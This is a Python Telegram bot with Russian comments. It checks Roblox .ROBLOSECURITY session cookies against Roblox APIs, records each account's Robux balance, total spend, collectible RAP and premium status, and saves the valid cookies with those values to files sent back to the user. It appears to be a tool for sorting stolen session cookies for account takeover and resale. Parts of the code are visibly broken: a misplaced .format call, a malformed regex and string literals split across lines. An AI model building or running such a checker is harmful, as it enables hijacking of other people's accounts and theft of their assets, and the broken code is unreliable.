import asyncio
import aiofiles
import requests
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile
import json
import re
from datetime import datetime

API_TOKEN = 'YOUR_BOT_TOKEN'
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

valid_cookies = []
total_stats = {'checked': 0, 'valid': 0, 'total_robux': 0}

async def check_roblox_cookie(cookie: str):
    """Улучшенная проверка Roblox куки с правильными API"""
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json'
    }
    
    try:
        # 1. Проверка валидности + профиль
        user_resp = requests.get('https://users.roblox.com/v1/users/authenticated', 
                               headers=headers, timeout=10)
        if user_resp.status_code != 200:
            return None
            
        user_data = user_resp.json()
        user_id = user_data['id']
        username = user_data['name']
        is_premium = user_data.get('isPremium', False)
        
        # 2. Робуксы (работает)
        wallet_resp = requests.get('https://economy.roblox.com/v1/wallet', 
                                 headers=headers, timeout=10)
        wallet_data = wallet_resp.json()
        robux = wallet_data.get('robux', 0)
        
        # 3. TOTAL DONATED (донат за все время) - правильный эндпоинт
        balance_resp = requests.get('https://economy.roblox.com/v2/users/{}/currency', 
                                  headers=headers, timeout=10).format(user_id)
        total_donated = 0
        if balance_resp.status_code == 200:
            balance_data = balance_resp.json()
            total_donated = balance_data.get('robuxTotal', 0)
        
        # 4. RAP - правильный эндпоинт для Recent Average Price
        rap_resp = requests.get(
            f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100',
            headers=headers, timeout=10
        )
        rap = 0
        if rap_resp.status_code == 200:
            rap_data = rap_resp.json()
            rap = rap_data.get('totalRap', 0)
        
        return {
            'cookie': cookie,
            'username': username,
            'user_id': user_id,
            'robux': robux,
            'total_donated': total_donated,
            'rap': rap,
            'premium': is_premium,
            'checked_at': datetime.now().isoformat()
        }
        
    except Exception:
        return None

async def save_valid_cookies():
    """Сохранение валидных куки в файл"""
    if not valid_cookies:
        return None
        
    filename = f'valid_roblox_cookies_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=== ВАЛИДНЫЕ ROBLOX КУКИ ===

")
        
        for data in valid_cookies:
            await f.write(f"👤 {data['username']} (ID: {data['user_id']})
")
            await f.write(f"💰 Робуксы: {data['robux']:,}
")
            await f.write(f"📈 Общий донат: {data['total_donated']:,}
")
            await f.write(f"💎 RAP: {data['rap']:,}
")
            await f.write(f"⭐ Премиум: {'Да' if data['premium'] else 'Нет'}
")
            await f.write(f"🍪 Куки: {data['cookie']}
")
            await f.write("-" * 50 + "

")
    
    return filename

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    await message.answer(
        "🔍 Отправьте Roblox куки (.ROBLOSECURITY) для проверки!

"
        "📊 Показывает:
"
        "• ✅ Робуксы (текущий баланс)
"
        "• 📈 Общий донат (за всё время)
"
        "• 💎 RAP (Recent Average Price)
"
        "• ⭐ Премиум статус"
    )

@dp.message(F.text)
async def check_cookie_handler(message: types.Message):
    cookie = message.text.strip()
    
    # Проверка формата куки
    if not re.match(r'^_ |WARNING:-DO-NOT-SHARE-THIS.', cookie):
        await message.answer("❌ Неверный формат Roblox куки!")
        return
    
    await message.answer("⏳ Проверяю куки...")
    
    result = await check_roblox_cookie(cookie)
    total_stats['checked'] += 1
    
    if result:
        valid_cookies.append(result)
        total_stats['valid'] += 1
        total_stats['total_robux'] += result['robux']
        
        stats_text = (
            f"✅ **ВАЛИДНАЯ КУКИ**

"
            f"👤 **{result['username']}** (ID: `{result['user_id']}`)
"
            f"💰 **Робуксы:** `{result['robux']:,}`
"
            f"📈 **Общий донат:** `{result['total_donated']:,}`
"
            f"💎 **RAP:** `{result['rap']:,}`
"
            f"⭐ **Премиум:** {'✅ Да' if result['premium'] else '❌ Нет'}

"
            f"📊 **Статистика:**
"
            f"👀 Проверено: `{total_stats['checked']}`
"
            f"✅ Валидно: `{total_stats['valid']}`
"
            f"💎 Всего робуксов: `{total_stats['total_robux']:,}`"
        )
        
        await message.answer(stats_text, parse_mode="Markdown")
        
        # Файл каждые 3 валидные куки
        if len(valid_cookies) % 3 == 0:
            filename = await save_valid_cookies()
            if filename:
                await message.answer_document(FSInputFile(filename))
    else:
        await message.answer(
            f"❌ **НЕВАЛИДНАЯ КУКИ**

"
            f"📊 **Статистика:**
"
            f"👀 Проверено: `{total_stats['checked']}`
"
            f"✅ Валидно: `{total_stats['valid']}`"
        , parse_mode="Markdown")

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
